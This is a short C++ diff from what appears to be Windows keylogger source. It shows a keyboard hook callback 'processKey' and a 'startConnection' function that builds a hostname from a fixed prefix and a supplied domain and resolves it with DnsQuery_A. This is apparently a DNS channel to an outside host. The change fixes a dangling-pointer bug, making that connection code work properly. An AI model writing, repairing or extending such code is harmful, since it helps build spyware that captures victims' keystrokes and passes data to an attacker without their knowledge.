@@ -118,9 +118,9 @@ LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int startConnection(const char* domain) {
-	std::ostringstream fullStream;
-	fullStream << "a.1.1.1." << domain;
-	const char* pOwnerName = fullStream.str().c_str();
+	std::string fullString = "a.1.1.1.";
+	fullString += domain;
+	const char* pOwnerName = fullString.c_str();
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord;
 	DNS_STATUS status = DnsQuery_A(pOwnerName,
